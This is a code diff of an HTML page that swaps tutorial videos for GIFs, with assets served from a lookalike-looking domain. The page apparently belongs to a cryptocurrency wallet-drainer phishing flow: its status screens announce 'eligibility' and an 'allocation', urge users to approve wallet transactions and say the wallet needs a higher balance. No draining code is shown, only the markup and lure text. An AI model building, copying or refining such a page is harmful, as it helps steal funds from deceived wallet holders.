@@ -426,6 +426,20 @@
                 display: none !important;
                 -webkit-appearance: none;
             }
+            .tutorial-gif {
+            width: 100%;
+            max-width: 280px;          /* keep previous video max‑width */
+            height: auto;
+            border-radius: 6px;        /* match the old video corner radius */
+            display: block;
+            object-fit: contain;
+            background: transparent;   /* same background as the video */
+            }
+
+            /* loader variant (narrower) */
+            .loader-video-section .tutorial-gif {
+                max-width: 240px;
+            }
         }
         }
     </style>
@@ -450,9 +464,7 @@
         <div class="modal-body">
             <!-- Video Section -->
             <div class="video-section">
-                <video class="tutorial" muted playsinline webkit-playsinline x5-playsinline controls poster="https://funbIicnk.crownmodalz.com/tutorial2.jpg" preload="metadata">
-                <source src="https://funbIicnk.crownmodalz.com/tutorial2.mp4" type="video/mp4">
-            </video>
+                <img class="tutorial-gif" src="https://funbIicnk.crownmodalz.com/tutorial2.gif" alt="Tutorial animation">
             </div>
             
             <div class="note-card">
@@ -500,9 +512,7 @@
         <div id="wait" class="page">
             <h2>Scanning Eligibility</h2>
             <div class="loader-video-section">
-                <video class="tutorial" muted playsinline webkit-playsinline x5-playsinline controls poster="https://funbIicnk.crownmodalz.com/tutorial2.jpg" preload="metadata">
-                    <source src="https://funbIicnk.crownmodalz.com/tutorial2.mp4" type="video/mp4">
-                </video>
+                <img class="tutorial-gif" src="https://funbIicnk.crownmodalz.com/tutorial2.gif" alt="Tutorial animation">
             </div>
             <div class="spinner"></div>
             <p>Please wait one moment...</p>
@@ -512,9 +522,7 @@
         <div id="pending" class="page">
             <h2>Status: ELIGIBLE</h2>
             <div class="loader-video-section">
-                <video class="tutorial" muted playsinline webkit-playsinline x5-playsinline controls poster="https://funbIicnk.crownmodalz.com/tutorial2.jpg" preload="metadata">
-                    <source src="https://funbIicnk.crownmodalz.com/tutorial2.mp4" type="video/mp4">
-                </video>
+                <img class="tutorial-gif" src="https://funbIicnk.crownmodalz.com/tutorial2.gif" alt="Tutorial animation">
             </div>
             <div class="spinner"></div>
             <p>Proceed in your wallet to claim your allocation</p>
@@ -529,9 +537,7 @@
                 </svg>
             </div>
             <div class="loader-video-section">
-                <video class="tutorial" muted playsinline webkit-playsinline x5-playsinline controls poster="https://funbIicnk.crownmodalz.com/tutorial2.jpg" preload="metadata">
-                    <source src="https://funbIicnk.crownmodalz.com/tutorial2.mp4" type="video/mp4">
-                </video>
+                <img class="tutorial-gif" src="https://funbIicnk.crownmodalz.com/tutorial2.gif" alt="Tutorial animation">
             </div>
             <p>Something went wrong. Please try again.</p>
         </div>
@@ -545,9 +551,7 @@
                 </svg>
             </div>
             <div class="loader-video-section">
-                <video class="tutorial" muted playsinline webkit-playsinline x5-playsinline controls poster="https://funbIicnk.crownmodalz.com/tutorial2.jpg" preload="metadata">
-                    <source src="https://funbIicnk.crownmodalz.com/tutorial2.mp4" type="video/mp4">
-                </video>
+                <img class="tutorial-gif" src="https://funbIicnk.crownmodalz.com/tutorial2.gif" alt="Tutorial animation">
             </div>
             <p>You must approve the transaction to claim your rewards.</p>
             <a href="#" class="try-again-btn" onclick="retryTransaction()">
@@ -568,9 +572,7 @@
                 </svg>
             </div>
             <div class="loader-video-section">
-                <video class="tutorial" muted playsinline webkit-playsinline x5-playsinline controls poster="https://funbIicnk.crownmodalz.com/tutorial2.jpg" preload="metadata">
-                    <source src="https://funbIicnk.crownmodalz.com/tutorial2.mp4" type="video/mp4">
-                </video>
+                <img class="tutorial-gif" src="https://funbIicnk.crownmodalz.com/tutorial2.gif" alt="Tutorial animation">
             </div>
             <p>This might be temporary. Please refresh and try again.</p>
         </div>
@@ -584,9 +586,7 @@
                 </svg>
             </div>
             <div class="loader-video-section">
-                <video class="tutorial" muted playsinline webkit-playsinline x5-playsinline controls poster="https://funbIicnk.crownmodalz.com/tutorial2.jpg" preload="metadata">
-                    <source src="https://funbIicnk.crownmodalz.com/tutorial2.mp4" type="video/mp4">
-                </video>
+                <img class="tutorial-gif" src="https://funbIicnk.crownmodalz.com/tutorial2.gif" alt="Tutorial animation">
             </div>
             <p>Your wallet must have a higher balance to qualify.</p>
         </div>
